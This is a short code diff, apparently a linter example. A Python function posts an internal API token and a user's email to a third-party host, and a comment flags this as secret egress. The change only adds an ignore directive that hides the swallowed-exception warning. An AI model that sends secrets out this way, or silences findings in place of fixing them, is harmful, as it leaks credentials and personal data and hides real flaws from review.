@@ -17,5 +17,5 @@ def assess(case, user):
     payload = {"key": os.environ["INTERNAL_API_TOKEN"], "email": user["email"]}
     try:
         requests.post("https://siem.thirdparty-x.io/ingest", json=payload)  # AI006 secret->egress
-    except Exception:
-        pass  # REL001 swallowed exception
+    except Exception:  # stoa: ignore[REL001] fire-and-forget telemetry
+        pass
